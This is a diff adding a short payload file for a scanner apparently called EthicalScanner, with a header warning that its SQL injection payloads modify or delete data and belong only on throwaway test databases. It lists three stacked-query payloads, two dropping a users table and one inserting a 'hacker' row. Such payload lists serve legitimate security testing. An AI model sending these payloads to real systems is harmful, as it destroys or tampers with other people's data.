@@ -1,0 +1,11 @@
+# EthicalScanner - SQLi DESTRUCTIVE payloads
+#
+# WARNING: these statements MODIFY OR DELETE DATA.
+# On a vulnerable target a stacked query really executes.
+# Load this file ONLY against a disposable test database
+# (local lab, DVWA, your own throwaway instance), never
+# against production or any system you do not fully control.
+
+'; DROP TABLE users--
+'; INSERT INTO users VALUES('hacker','hacked')--
+1; DROP TABLE users--
